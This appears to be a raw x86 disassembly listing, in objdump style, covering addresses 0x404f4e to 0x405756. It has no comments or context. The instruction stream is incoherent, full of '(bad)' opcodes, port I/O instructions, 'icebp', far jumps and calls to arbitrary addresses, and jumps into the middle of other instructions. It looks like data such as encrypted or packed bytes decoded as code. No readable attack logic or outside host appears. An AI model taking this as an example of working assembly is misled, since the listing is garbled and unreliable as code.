  404f4e:	retf   
  404f4f:	xchg   ebx,eax
  404f50:	inc    ecx
  404f51:	and    bl,dl
  404f53:	je     0x404f19
  404f55:	ror    DWORD PTR [edx*8+0x7b020ec2],cl
  404f5c:	xor    BYTE PTR [esi-0x14],dl
  404f5f:	jmp    0xfa45:0x8cde50d4
  404f66:	jecxz  0x404f87
  404f68:	repnz sbb al,0x1b
  404f6b:	xlat   BYTE PTR ds:[ebx]
  404f6c:	add    BYTE PTR [esi-0x4739ced4],cl
  404f72:	je     0x404f8a
  404f74:	dec    edx
  404f75:	dec    BYTE PTR [ebp+0x6c28c5e0]
  404f7b:	cld    
  404f7c:	mov    cl,0x47
  404f7e:	fstp   DWORD PTR [ebx+edi*4-0x7c79a249]
  404f85:	imul   ah
  404f87:	test   bl,bl
  404f89:	test   BYTE PTR [esi-0x2e15d78a],al
  404f8f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404f90:	mov    cl,0x29
  404f92:	pop    ebx
  404f93:	shl    DWORD PTR ds:0x5d01195e,0x4c
  404f9a:	das    
  404f9b:	retf   
  404f9c:	rol    BYTE PTR [ebx],0x4
  404f9f:	and    al,0xcc
  404fa1:	(bad)  
  404fa2:	jmp    0x404fe9
  404fa4:	pop    edi
  404fa5:	mov    ch,0x5f
  404fa7:	push   0xfffffffe
  404fa9:	xchg   DWORD PTR [ebp+0x36],eax
  404fac:	dec    esi
  404fad:	shr    cl,0x9c
  404fb0:	xchg   edi,eax
  404fb1:	(bad)  
  404fb2:	out    0xab,al
  404fb4:	int    0x5c
  404fb6:	or     eax,0xefbcb70a
  404fbb:	add    ebp,edi
  404fbd:	adc    ah,ch
  404fbf:	loope  0x404fdb
  404fc1:	pop    esi
  404fc2:	push   ebx
  404fc3:	ja     0x405015
  404fc5:	mov    dh,0xa1
  404fc7:	xlat   BYTE PTR ds:[ebx]
  404fc8:	mov    al,0x82
  404fca:	nop
  404fcb:	out    dx,eax
  404fcc:	or     dh,ah
  404fce:	in     al,dx
  404fcf:	push   ecx
  404fd0:	or     DWORD PTR [eax],ebp
  404fd2:	shr    edi,0x65
  404fd5:	dec    edx
  404fd6:	test   al,0x77
  404fd8:	sbb    ah,bh
  404fda:	xor    eax,0x39360569
  404fdf:	sub    cl,BYTE PTR [esi+0x3a71fcc7]
  404fe5:	aad    0xa6
  404fe7:	scas   eax,DWORD PTR es:[edi]
  404fe8:	adc    bl,ch
  404fea:	and    DWORD PTR [edx],edx
  404fec:	push   edx
  404fed:	aas    
  404fee:	lea    ecx,[esi+eax*1+0x54db67cf]
  404ff5:	push   ebx
  404ff6:	push   edi
  404ff7:	or     eax,0x271e2bf9
  404ffc:	inc    esi
  404ffd:	mov    ah,0x33
  404fff:	push   eax
  405000:	inc    DWORD PTR [ebp+0x4fcd5177]
  405006:	dec    edi
  405007:	test   ebp,ebx
  405009:	mov    DWORD PTR [edx-0x64],edi
  40500c:	mov    al,ds:0x21647a28
  405011:	jns    0x404fdb
  405013:	inc    ebp
  405014:	popa   
  405015:	gs mov cl,0xbe
  405018:	mov    bh,0x20
  40501a:	mov    ds:0x1d99bbc3,eax
  40501f:	adc    eax,edx
  405021:	ror    BYTE PTR [ebx-0x4f7c9fac],1
  405027:	test   eax,0x2785c22a
  40502c:	lds    esp,FWORD PTR [edi]
  40502e:	sbb    DWORD PTR [edx],ebp
  405030:	retf   
  405031:	repnz stos DWORD PTR es:[edi],eax
  405033:	adc    BYTE PTR [edx-0x6f3e31a4],ch
  405039:	call   0x81b98967
  40503e:	mov    es,WORD PTR [edx]
  405040:	shl    BYTE PTR [ecx-0x6eb7ed36],cl
  405046:	jnp    0x4050b0
  405048:	imul   esp,DWORD PTR [edx+eiz*8+0x6b862c68],0xe464d3f9
  405053:	xchg   edi,eax
  405054:	and    al,0x45
  405056:	add    DWORD PTR [ebx-0x12f7c371],eax
  40505c:	retf   
  40505d:	rcr    al,0x9f
  405060:	mov    edx,0x83bd2b70
  405065:	mov    dl,0xde
  405067:	daa    
  405068:	xchg   ebp,eax
  405069:	js     0x40503d
  40506b:	aas    
  40506c:	mov    bl,0xc1
  40506e:	dec    eax
  40506f:	mov    ebp,0x2cc08416
  405074:	lock add bh,dl
  405077:	fsub   st,st(3)
  405079:	sub    al,0x7f
  40507b:	and    DWORD PTR [eax],ebp
  40507d:	ins    BYTE PTR es:[edi],dx
  40507e:	pop    es
  40507f:	rol    BYTE PTR [edi-0x4f],0x8b
  405083:	fxam   
  405085:	aas    
  405086:	loopne 0x4050ff
  405088:	push   ebp
  405089:	lahf   
  40508a:	xchg   ecx,eax
  40508b:	inc    edx
  40508c:	ss inc edx
  40508e:	xchg   ebx,eax
  40508f:	outs   dx,DWORD PTR ds:[esi]
  405090:	ror    BYTE PTR [edi-0x59211aac],0x2c
  405097:	daa    
  405098:	jo     0x40508a
  40509a:	mul    BYTE PTR [ecx]
  40509c:	shl    DWORD PTR [ebx+eiz*1-0x74],1
  4050a0:	outs   dx,DWORD PTR ds:[esi]
  4050a1:	jnp    0x4050a7
  4050a3:	mov    ecx,0x52b84c87
  4050a8:	push   esi
  4050a9:	sbb    al,dh
  4050ab:	jb     0x4050dc
  4050ad:	test   dl,dh
  4050af:	mov    esp,0x3dc7492b
  4050b4:	(bad)  
  4050b6:	sub    BYTE PTR [edi],cl
  4050b8:	push   ebp
  4050b9:	mov    bl,cl
  4050bb:	icebp  
  4050bc:	(bad)  
  4050bd:	xor    bl,bh
  4050bf:	jae    0x405096
  4050c1:	mov    BYTE PTR [ecx+0x7b],dl
  4050c4:	adc    eax,0xe0ab9155
  4050c9:	int3   
  4050ca:	xchg   DWORD PTR [eax-0x2a537f83],ebx
  4050d0:	ins    BYTE PTR es:[edi],dx
  4050d1:	ds or  edi,esi
  4050d4:	retf   0xf71f
  4050d7:	sub    edx,DWORD PTR [edi]
  4050d9:	pusha  
  4050da:	mov    dh,0x4e
  4050dc:	sti    
  4050dd:	mov    ebp,0xc62ae14a
  4050e2:	mov    edi,0xcae20c6
  4050e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4050e8:	mov    ebp,0x8390a84d
  4050ed:	add    al,bl
  4050ef:	test   eax,0x44999ba0
  4050f4:	repnz daa 
  4050f6:	in     eax,0x80
  4050f8:	xor    cl,BYTE PTR [ebx-0x6f]
  4050fb:	mov    edi,0x47b72f21
  405100:	xor    al,0xdf
  405102:	inc    eax
  405103:	mov    ebx,0xa3edb30b
  405108:	jp     0x40508b
  40510a:	clc    
  40510b:	pop    es
  40510c:	sub    BYTE PTR [ebp+0x697bd90e],bl
  405112:	ror    DWORD PTR [ebp+0x65871a27],1
  405118:	ja     0x4050af
  40511a:	or     al,al
  40511c:	adc    DWORD PTR [ebp+0x35],0x34a0a07b
  405123:	jmp    0x48ad81fd
  405128:	push   cs
  405129:	sbb    dl,al
  40512b:	inc    edx
  40512c:	pop    edx
  40512d:	lea    ecx,ds:0x6287a83f
  405133:	retf   
  405134:	inc    ebp
  405135:	adc    al,0x52
  405137:	dec    ebx
  405138:	pushf  
  405139:	or     eax,0x95bdd339
  40513e:	sub    BYTE PTR [esi+0x4b30ed29],0x68
  405145:	dec    ebx
  405146:	mov    bh,0xbd
  405148:	test   BYTE PTR [ecx-0x79],cl
  40514b:	scas   eax,DWORD PTR es:[edi]
  40514c:	add    esp,DWORD PTR [ebx-0x1b]
  40514f:	jnp    0x405141
  405151:	add    esp,ebx
  405153:	sub    BYTE PTR [ebx-0x3e],al
  405156:	in     al,0xa3
  405158:	lock icebp 
  40515a:	jb     0x405135
  40515c:	adc    esi,DWORD PTR [eax-0x31]
  40515f:	add    ecx,DWORD PTR [ecx]
  405161:	fnsave [ebp+0x8]
  405164:	adc    cl,dh
  405166:	xchg   ecx,eax
  405167:	lods   eax,DWORD PTR ds:[esi]
  405168:	mov    dh,0xd9
  40516a:	jle    0x4051d0
  40516c:	mov    ecx,0xa52d259e
  405171:	out    dx,eax
  405172:	sbb    DWORD PTR [edx],ecx
  405174:	and    DWORD PTR [eax+0x38f7faee],esp
  40517a:	(bad)  
  40517b:	lea    ecx,[eax]
  40517d:	push   eax
  40517e:	mov    esi,0x74cbb97e
  405183:	iret   
  405184:	imul   edx,DWORD PTR [eax+esi*8+0x6],0xcf1390cb
  40518c:	rol    BYTE PTR [esi],1
  40518e:	pop    ebx
  40518f:	in     eax,dx
  405190:	mov    ds:0xfcb907ae,al
  405195:	outs   dx,BYTE PTR ds:[esi]
  405196:	lds    esp,FWORD PTR [ecx]
  405198:	int3   
  405199:	sub    DWORD PTR gs:[edx],edi
  40519c:	pop    eax
  40519d:	push   esi
  40519e:	or     edi,DWORD PTR [eax]
  4051a0:	and    cl,BYTE PTR [eax+0x7]
  4051a3:	sar    DWORD PTR [ecx+0xf896985],1
  4051a9:	sbb    al,0xaf
  4051ab:	xor    DWORD PTR [ebp+0x5d],0xdebcfc93
  4051b2:	cmp    al,0x60
  4051b4:	mov    eax,ds:0xac2d4f00
  4051b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4051ba:	in     al,0xa0
  4051bc:	leave  
  4051bd:	mov    eax,0xd3e10af
  4051c2:	cmp    edi,esp
  4051c4:	cmp    BYTE PTR [ebx+0x38],bl
  4051c7:	loop   0x4051bc
  4051c9:	sbb    dl,BYTE PTR ds:0x10f5f791
  4051cf:	inc    ebx
  4051d0:	sub    DWORD PTR [eax-0x78d2a539],0xffffffb9
  4051d7:	adc    ah,cl
  4051d9:	xchg   esp,eax
  4051da:	adc    al,0xe4
  4051dc:	push   cs
  4051dd:	pop    edi
  4051de:	shr    BYTE PTR [ebx-0x74],1
  4051e1:	mov    ecx,0xc8f3d914
  4051e6:	mov    ds:0x51f19e63,eax
  4051eb:	xchg   esi,eax
  4051ec:	std    
  4051ed:	push   cs
  4051ee:	icebp  
  4051ef:	fistp  QWORD PTR [edx+0xc]
  4051f2:	xchg   edi,eax
  4051f3:	xlat   BYTE PTR ds:[ebx]
  4051f4:	pop    ebp
  4051f5:	adc    DWORD PTR [esi+ebx*4-0x4],esi
  4051f9:	je     0x40519f
  4051fb:	mov    DWORD PTR [ebx+0x38034b2a],ebx
  405201:	cli    
  405202:	imul   ebx,DWORD PTR [esi],0x52
  405205:	sub    BYTE PTR [edx+eax*4-0x33],bh
  405209:	pusha  
  40520a:	and    eax,ebx
  40520c:	fwait
  40520d:	out    dx,al
  40520e:	pop    edx
  40520f:	ss lahf 
  405211:	out    dx,al
  405212:	mov    ds:0x6b7c9700,al
  405217:	imul   esp,DWORD PTR [ebp+0x7e2c8764],0xd2c93262
  405221:	and    cl,dh
  405223:	cmc    
  405224:	ret    
  405225:	jmp    0xbe582f9f
  40522a:	sub    ah,BYTE PTR [eax-0x5e8e2712]
  405230:	fucom  st(0)
  405232:	mov    esi,0x62a574d0
  405237:	scas   eax,DWORD PTR es:[edi]
  405238:	les    eax,FWORD PTR [edi]
  40523a:	je     0x40521d
  40523c:	cmp    cl,BYTE PTR [esi]
  40523e:	xchg   edx,eax
  40523f:	shr    DWORD PTR [edx],0xa3
  405242:	sahf   
  405243:	xor    eax,0xdb8e5e9f
  405248:	addr16 lahf 
  40524a:	jo     0x405215
  40524c:	hlt    
  40524d:	int3   
  40524e:	call   0xc815:0x808b3bb0
  405255:	scas   al,BYTE PTR es:[edi]
  405256:	jnp    0x405277
  405258:	dec    esp
  405259:	push   esp
  40525a:	jle    0x4051e1
  40525c:	mov    ebx,0x7eaf9500
  405261:	lahf   
  405262:	(bad)  
  405263:	pop    esi
  405264:	xor    BYTE PTR [eax+0x1c],dh
  405267:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405268:	cmp    dl,al
  40526a:	inc    eax
  40526b:	loope  0x405291
  40526d:	sar    BYTE PTR [ebx],cl
  40526f:	imul   eax,DWORD PTR [edi+0x30afa49f],0xd8b71cd7
  405279:	fidivr WORD PTR [ebx-0x35]
  40527c:	mov    esp,0x940ef5c8
  405281:	sbb    eax,0x9e7c9756
  405286:	or     ch,ch
  405288:	pop    es
  405289:	mov    ecx,0x4224a243
  40528e:	mov    ch,0x6e
  405290:	inc    edi
  405291:	cmp    ecx,edx
  405293:	add    BYTE PTR [edi+0x73e6ee4c],0x87
  40529a:	inc    esp
  40529b:	mov    edx,0x9a158fa7
  4052a0:	mov    bl,0xf0
  4052a2:	es int3 
  4052a4:	pop    ss
  4052a5:	repnz dec ebx
  4052a7:	adc    al,0x58
  4052a9:	mov    ds:0x76de29ff,eax
  4052ae:	push   esi
  4052af:	addr16 cli 
  4052b1:	cmp    esp,edx
  4052b3:	ins    BYTE PTR es:[edi],dx
  4052b4:	lods   eax,DWORD PTR ds:[esi]
  4052b5:	out    dx,eax
  4052b6:	repnz pop eax
  4052b8:	sahf   
  4052b9:	xchg   esi,eax
  4052ba:	hlt    
  4052bb:	inc    edx
  4052bc:	jmp    0x2f75:0x4833aff4
  4052c3:	icebp  
  4052c4:	xor    DWORD PTR [edi+ecx*8-0x3e1c344],ecx
  4052cb:	call   0x1580ab3a
  4052d0:	loopne 0x405276
  4052d2:	outs   dx,BYTE PTR ds:[esi]
  4052d3:	rcl    BYTE PTR [eax+0x4b],1
  4052d6:	fcom   DWORD PTR [esp+edx*8-0x3769c566]
  4052dd:	ins    DWORD PTR es:[edi],dx
  4052de:	out    0xf1,al
  4052e0:	push   ecx
  4052e1:	sbb    eax,0xb30b7ac2
  4052e6:	mov    bh,0x89
  4052e8:	add    al,0xe7
  4052ea:	pop    ss
  4052eb:	add    bh,BYTE PTR [ebx+0x6399098a]
  4052f1:	pop    es
  4052f2:	dec    ebx
  4052f3:	inc    ebx
  4052f4:	push   ebp
  4052f5:	mov    ds:0x6f1e7a55,al
  4052fa:	inc    eax
  4052fb:	push   ss
  4052fc:	push   ss
  4052fd:	jecxz  0x4052b3
  4052ff:	xchg   BYTE PTR es:[ebx+eiz*1+0x7a],dh
  405304:	lods   al,BYTE PTR ds:[esi]
  405305:	xchg   esp,eax
  405306:	and    eax,0xd886e828
  40530b:	mov    bh,0x8
  40530d:	popf   
  40530e:	mov    eax,0x5bb78566
  405313:	mov    dh,0x97
  405315:	aam    0x4d
  405317:	addr16 xchg ecx,eax
  405319:	leave  
  40531a:	adc    DWORD PTR [ecx+0x7e5ec820],0x6066e436
  405324:	rcl    ebx,cl
  405326:	and    ebx,DWORD PTR [edx-0x4c772b5b]
  40532c:	and    BYTE PTR [ebx],0xdc
  40532f:	mov    ds:0x53efdb5a,eax
  405334:	push   ebx
  405335:	imul   ebx,DWORD PTR [edi+edx*1],0x2b
  405339:	push   es
  40533a:	ja     0x4052c8
  40533c:	in     al,dx
  40533d:	shr    DWORD PTR [edx-0x3a4884ca],cl
  405343:	jmp    0xc9d5:0x9ec46985
  40534a:	mov    ah,0x29
  40534c:	dec    ebp
  40534d:	xor    BYTE PTR [edx+0x7c],al
  405350:	enter  0x21ca,0xe8
  405354:	enter  0x6dab,0x24
  405358:	addr16 push ss
  40535a:	or     al,dl
  40535c:	popf   
  40535d:	retf   
  40535e:	push   ds
  40535f:	test   eax,0xded32165
  405364:	or     al,0x71
  405366:	or     cl,BYTE PTR [ecx]
  405368:	stc    
  405369:	ss enter 0xf05a,0x1b
  40536e:	fistp  QWORD PTR [esp+ecx*8]
  405371:	sub    BYTE PTR [esi+0x8],cl
  405374:	dec    BYTE PTR [edx-0x377c6d04]
  40537a:	in     eax,0xea
  40537c:	in     eax,0xff
  40537e:	loop   0x405378
  405380:	xor    eax,0xda0f71ac
  405385:	rcr    BYTE PTR [eax-0x66],cl
  405388:	jne    0x405390
  40538a:	retf   
  40538b:	sub    al,0xd1
  40538d:	sub    BYTE PTR [edx+0x59],al
  405390:	mov    al,ds:0xb71cd9c9
  405395:	rcl    bh,1
  405397:	mov    ecx,0x2dcb2fcb
  40539c:	sub    BYTE PTR [eax],dh
  40539e:	ret    0x94ac
  4053a1:	es cdq 
  4053a3:	mov    dh,0x6c
  4053a5:	mov    BYTE PTR [eax],0xc
  4053a8:	inc    eax
  4053a9:	cmp    eax,0x4526c710
  4053ae:	sbb    ebx,DWORD PTR [ebp+0x28]
  4053b1:	(bad)  
  4053b2:	adc    eax,0xd33f4e6a
  4053b7:	lds    esi,FWORD PTR ds:0x4e560138
  4053bd:	outs   dx,BYTE PTR ds:[esi]
  4053be:	(bad)  
  4053bf:	int3   
  4053c0:	cmp    al,0xae
  4053c2:	aaa    
  4053c3:	(bad)  
  4053c4:	push   ss
  4053c5:	sbb    DWORD PTR [esi+0x4f0c6443],eax
  4053cb:	inc    esi
  4053cc:	fcomp  QWORD PTR [ecx+ebx*2]
  4053cf:	and    DWORD PTR [ecx],edi
  4053d1:	push   cs
  4053d2:	cmp    al,0x82
  4053d4:	mov    ebp,0xcb74f7a
  4053d9:	jmp    0x405425
  4053db:	inc    ebx
  4053dc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4053dd:	add    dh,dh
  4053df:	jo     0x405452
  4053e1:	mov    ecx,0x5c655b27
  4053e6:	mov    dh,0xf8
  4053e8:	dec    esi
  4053e9:	loop   0x405387
  4053eb:	dec    edi
  4053ec:	(bad)  
  4053ed:	jp     0x40543f
  4053ef:	shr    DWORD PTR [edx-0x5b28baa4],0x24
  4053f6:	loop   0x4053f9
  4053f8:	mov    ds:0x87960ed0,eax
  4053fd:	test   BYTE PTR [ecx],ch
  4053ff:	aam    0xf7
  405401:	stos   BYTE PTR es:[edi],al
  405402:	sub    DWORD PTR [edx+ebp*2+0x8],0xffffffad
  405407:	adc    ecx,DWORD PTR [esi-0x39]
  40540a:	add    DWORD PTR [esi+0x50],esp
  40540d:	aaa    
  40540e:	loopne 0x40546d
  405410:	sar    DWORD PTR [eax+ebp*1],0x2e
  405414:	or     bl,dh
  405416:	(bad)  
  405417:	dec    eax
  405418:	in     eax,0x89
  40541a:	test   al,0x87
  40541c:	adc    BYTE PTR [edx-0x34],ah
  40541f:	inc    ebx
  405420:	fwait
  405421:	popf   
  405422:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405423:	mov    ebx,0x9ef05054
  405428:	pop    es
  405429:	jno    0x40546c
  40542b:	or     edx,eax
  40542d:	add    BYTE PTR [edi+0x1fcba2c0],cl
  405433:	and    DWORD PTR [ebx-0x1c],0xffffffe4
  405437:	movntps XMMWORD PTR [edx],xmm3
  40543a:	daa    
  40543b:	ret    0xa18a
  40543e:	test   esi,esi
  405440:	cwde   
  405441:	push   esp
  405442:	lods   al,BYTE PTR ds:[esi]
  405443:	ror    DWORD PTR [ecx-0x2fd2aa5c],0x1a
  40544a:	imul   eax,DWORD PTR [ebx+0xa167113],0xffffffd1
  405451:	push   ebp
  405452:	loop   0x40543b
  405454:	dec    eax
  405455:	add    ah,BYTE PTR [eax-0x8]
  405458:	test   eax,0x3239bbc0
  40545d:	inc    DWORD PTR [ebx-0x8339f52]
  405463:	loopne 0x4053e9
  405465:	test   BYTE PTR [ecx],dh
  405467:	(bad)  
  405468:	addr16 (bad) 
  40546a:	lea    ecx,[ecx+0x76]
  40546d:	push   cs
  40546e:	in     eax,0xd
  405470:	(bad)  
  405471:	repnz shl DWORD PTR [ebp-0x44400a34],1
  405478:	mov    ebx,0xd36bd356
  40547d:	mov    fs,ecx
  40547f:	ins    DWORD PTR es:[edi],dx
  405480:	mov    dl,0x8f
  405482:	inc    esp
  405483:	sbb    ebx,DWORD PTR [edx+0x2f]
  405486:	cmp    DWORD PTR [ebx],0x57
  405489:	into   
  40548a:	push   eax
  40548b:	lock mov al,0xc1
  40548e:	mov    edx,0x134bad25
  405493:	(bad)  
  405494:	imul   esi,DWORD PTR [esi+ecx*1-0x3f68ef7],0xffffffc2
  40549c:	repnz cmp DWORD PTR [eax-0x2d],ebx
  4054a0:	inc    esi
  4054a1:	in     eax,dx
  4054a2:	add    DWORD PTR ds:0x3f5723fc,esp
  4054a8:	pop    eax
  4054a9:	sub    al,0x90
  4054ab:	rol    BYTE PTR [esi],0x9e
  4054ae:	in     eax,dx
  4054af:	arpl   di,bx
  4054b1:	cmc    
  4054b2:	pushf  
  4054b3:	mov    ebx,ds
  4054b5:	push   ebp
  4054b6:	addr16 je 0x4054c8
  4054b9:	(bad)  
  4054ba:	push   esp
  4054bb:	mov    edx,0x6d024bb0
  4054c0:	lods   al,BYTE PTR ds:[esi]
  4054c1:	cwde   
  4054c2:	icebp  
  4054c3:	pop    edx
  4054c4:	push   cs
  4054c5:	pop    edx
  4054c6:	mov    DWORD PTR [esi-0xbdb863],edi
  4054cc:	xchg   esi,eax
  4054cd:	xchg   edi,eax
  4054ce:	and    al,0x4f
  4054d0:	inc    esp
  4054d1:	jb     0x40551c
  4054d3:	jge    0x4054e6
  4054d5:	dec    ebp
  4054d6:	(bad)  
  4054d7:	push   ebx
  4054d8:	jae    0x405490
  4054da:	test   DWORD PTR [ebx],eax
  4054dc:	push   0x80d0e04
  4054e1:	or     ebp,edi
  4054e3:	adc    DWORD PTR [ebp-0xab72849],edi
  4054e9:	xor    edi,eax
  4054eb:	aas    
  4054ec:	xor    al,0x14
  4054ee:	lahf   
  4054ef:	rcl    BYTE PTR [eax-0x68],cl
  4054f2:	mov    esi,0x1c0023bf
  4054f7:	sar    ch,0xeb
  4054fa:	jmp    0xa3f7865d
  4054ff:	sbb    al,0xbf
  405501:	mov    dh,0x6e
  405503:	pop    ds
  405504:	outs   dx,BYTE PTR ds:[esi]
  405505:	jnp    0x405500
  405507:	mov    ch,0x52
  405509:	fisubr DWORD PTR [edi+edi*4-0x10622f09]
  405510:	mov    esi,0xcaac6506
  405515:	dec    ebp
  405516:	push   ss
  405517:	jae    0x4054a6
  405519:	jl     0x4054e5
  40551b:	and    ch,BYTE PTR [esi+0x1f5c3b96]
  405521:	js     0x4054a4
  405523:	cmp    al,0x11
  405525:	or     eax,0x41549fc3
  40552a:	iret   
  40552b:	hlt    
  40552c:	jns    0x405550
  40552e:	jns    0x4054c6
  405530:	sub    al,0x43
  405532:	les    ecx,FWORD PTR [ecx+0x149d7290]
  405538:	sbb    DWORD PTR [edx+ebp*1-0x428f800e],eax
  40553f:	xchg   ecx,eax
  405540:	fbstp  TBYTE PTR [ebx-0x8]
  405543:	stos   BYTE PTR es:[edi],al
  405544:	call   0x9adb:0xfd9ad008
  40554b:	outs   dx,BYTE PTR ds:[esi]
  40554c:	sbb    eax,0x42966ef6
  405551:	add    al,0x92
  405553:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405554:	popa   
  405555:	fsubr  DWORD PTR [edx+0x6a3de560]
  40555b:	cmp    ch,BYTE PTR [esi-0x48f26464]
  405561:	addr16 dec ebp
  405563:	and    dh,BYTE PTR [edi-0x5cf19869]
  405569:	shl    BYTE PTR [eax],1
  40556b:	out    dx,al
  40556c:	mov    edi,0xa3c71612
  405571:	add    al,0x9c
  405573:	nop
  405574:	scas   eax,DWORD PTR es:[edi]
  405575:	lock xchg esp,eax
  405577:	clc    
  405578:	les    edi,FWORD PTR [ebp-0xdce799a]
  40557e:	stos   DWORD PTR es:[edi],eax
  40557f:	fisubr DWORD PTR [ebx-0x41]
  405582:	adc    DWORD PTR [esi+0x31eac494],esi
  405588:	push   0xffffffb0
  40558a:	push   eax
  40558b:	ins    BYTE PTR es:[edi],dx
  40558c:	enter  0x5403,0x7b
  405590:	add    dh,BYTE PTR [esi-0x3f]
  405593:	push   cs
  405594:	jae    0x40553b
  405596:	sbb    al,dh
  405598:	mov    ebp,0xcf4ca740
  40559d:	call   0x269f75a9
  4055a2:	xchg   esi,eax
  4055a3:	int3   
  4055a4:	push   edi
  4055a5:	inc    ecx
  4055a6:	js     0x40557d
  4055a8:	sti    
  4055a9:	les    ebp,FWORD PTR [edx-0x64396296]
  4055af:	cmp    DWORD PTR [edx-0x73],ebp
  4055b2:	dec    esi
  4055b3:	push   eax
  4055b4:	jecxz  0x405602
  4055b6:	xchg   BYTE PTR [eax+0x17c9c8ce],bh
  4055bc:	mov    ecx,DWORD PTR [ebx+0x63]
  4055bf:	inc    edi
  4055c0:	shl    BYTE PTR [ecx],1
  4055c2:	loope  0x4055c8
  4055c4:	inc    edi
  4055c5:	std    
  4055c6:	in     eax,dx
  4055c7:	add    eax,0x3575499f
  4055cc:	sahf   
  4055cd:	std    
  4055ce:	mov    bl,0xc7
  4055d0:	xor    BYTE PTR [ebx],al
  4055d2:	cmc    
  4055d3:	xchg   esi,eax
  4055d4:	mov    cl,0xe8
  4055d6:	and    eax,0xfc31185e
  4055db:	mov    ah,0xbb
  4055dd:	pop    eax
  4055de:	push   ebx
  4055df:	retf   0x6ad1
  4055e2:	fsub   st(5),st
  4055e4:	jno    0x40563b
  4055e6:	or     esi,DWORD PTR [edi]
  4055e8:	(bad)
  4055ed:	pop    esi
  4055ee:	mov    edi,0x8a913b5
  4055f3:	fwait
  4055f4:	cli    
  4055f5:	lds    eax,FWORD PTR [ecx]
  4055f7:	dec    edx
  4055f8:	jnp    0x40561d
  4055fa:	aad    0x9d
  4055fc:	imul   esi,DWORD PTR [esp+ebx*2+0x54eb9f23],0xffffffdf
  405604:	js     0x40559c
  405606:	adc    ch,ch
  405608:	stc    
  405609:	retf   0xefaa
  40560c:	and    DWORD PTR [ebx-0xe4ccb1f],edx
  405612:	call   0x4e0a:0x81fb2516
  405619:	hlt    
  40561a:	ret    0x80c5
  40561d:	push   esp
  40561e:	inc    esp
  40561f:	mov    bh,0xf9
  405621:	outs   dx,DWORD PTR ds:[esi]
  405622:	sbb    ch,BYTE PTR [edi+0x6c9e3a13]
  405628:	push   esp
  405629:	xor    eax,0xe392f7cf
  40562e:	sbb    al,0x84
  405630:	and    al,0x18
  405632:	out    dx,eax
  405633:	and    BYTE PTR [eax-0x68],bh
  405636:	jb     0x40568a
  405638:	or     esp,DWORD PTR [ebx-0x1e5dac8f]
  40563e:	mov    ebx,0xdd4c90da
  405643:	pusha  
  405644:	pusha  
  405645:	push   edi
  405646:	jbe    0x40563e
  405648:	mov    ch,0x81
  40564a:	repz fist DWORD PTR [di+0x5d]
  40564f:	(bad)  
  405650:	pop    ds
  405651:	loop   0x405612
  405653:	popf   
  405654:	jne    0x405608
  405656:	imul   ebx,DWORD PTR [edi],0x83456067
  40565c:	adc    al,0x88
  40565e:	xlat   BYTE PTR fs:[ebx]
  405660:	sbb    edx,DWORD PTR [esi-0x29c25a90]
  405666:	or     esi,DWORD PTR [edx+0x4ceb6d6]
  40566c:	jl     0x405687
  40566e:	push   esp
  40566f:	int3   
  405670:	add    BYTE PTR ds:0x584393ae,bl
  405676:	imul   ecx,DWORD PTR [edi+0xf0ff5af],0xe4068c49
  405680:	call   0xd0e78d01
  405685:	shr    edx,1
  405687:	dec    edi
  405688:	push   ecx
  405689:	repnz and BYTE PTR [ecx+0x1697d4c8],ch
  405690:	and    BYTE PTR [eax],dl
  405692:	cmp    eax,0xc5dfa16c
  405697:	mov    WORD PTR [ebp+0x79ba6e67],gs
  40569d:	sbb    esi,DWORD PTR [ebx+0x6b]
  4056a0:	add    dh,bl
  4056a2:	jg     0x405634
  4056a4:	mov    ch,0x76
  4056a6:	pop    ss
  4056a7:	or     esi,DWORD PTR [ebx-0x37]
  4056aa:	jns    0x4056a4
  4056ac:	dec    esp
  4056ad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4056ae:	stos   DWORD PTR es:[edi],eax
  4056af:	push   ds
  4056b0:	push   ss
  4056b1:	aam    0xc6
  4056b3:	xchg   ebp,eax
  4056b4:	or     eax,0x54309c17
  4056b9:	ret    0x4137
  4056bc:	dec    ecx
  4056bd:	sbb    eax,0x759d9fab
  4056c2:	mov    bl,0xe3
  4056c4:	fcompp 
  4056c6:	pop    ebx
  4056c7:	add    esi,DWORD PTR [edi+0x376c5a26]
  4056cd:	rol    ecx,cl
  4056cf:	retf   0x35e5
  4056d2:	push   cs
  4056d3:	pop    ss
  4056d4:	adc    DWORD PTR [ebx+0x14d3fd4],0x3485da7
  4056de:	sub    ebp,DWORD PTR [ebx]
  4056e0:	mov    eax,ds:0x40a85907
  4056e5:	mov    ebx,0x864955a2
  4056ea:	call   FWORD PTR [ebx+ebp*2+0x4]
  4056ee:	out    dx,eax
  4056ef:	(bad)  
  4056f1:	sbb    DWORD PTR [esp+ecx*2],0xffffffea
  4056f5:	out    0x13,eax
  4056f7:	push   esi
  4056f8:	cmp    BYTE PTR [eax],0x4a
  4056fb:	test   esp,esp
  4056fd:	sbb    al,0x88
  4056ff:	sbb    DWORD PTR [edx-0x4c39a281],edx
  405705:	enter  0x8ac4,0xb1
  405709:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40570a:	pop    edx
  40570b:	add    BYTE PTR [edi],cl
  40570d:	outs   dx,BYTE PTR ds:[esi]
  40570e:	test   ebp,ebp
  405710:	in     eax,0x68
  405712:	sbb    BYTE PTR [ecx-0x630211e0],bl
  405718:	add    bl,BYTE PTR [esi+ecx*2+0x6f81e9fc]
  40571f:	outs   dx,DWORD PTR ds:[esi]
  405720:	sub    ebp,DWORD PTR [eax]
  405722:	in     al,dx
  405723:	ret    
  405724:	inc    esi
  405725:	imul   ebx,DWORD PTR [ecx],0x2d2fb37b
  40572b:	test   DWORD PTR [ebp-0x6eaec002],edi
  405731:	inc    ecx
  405732:	add    DWORD PTR [edx-0x6b],0x1ffc289c
  405739:	mov    WORD PTR [ebp-0x672ca01d],ds
  40573f:	mov    bl,BYTE PTR [esp+edx*8+0x6b61f265]
  405746:	push   ebp
  405747:	std    
  405748:	cmp    edx,DWORD PTR [edx]
  40574a:	xchg   DWORD PTR ds:0x94ec3071,esi
  405750:	dec    ebp
  405751:	or     eax,0xfc973b10
  405756:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
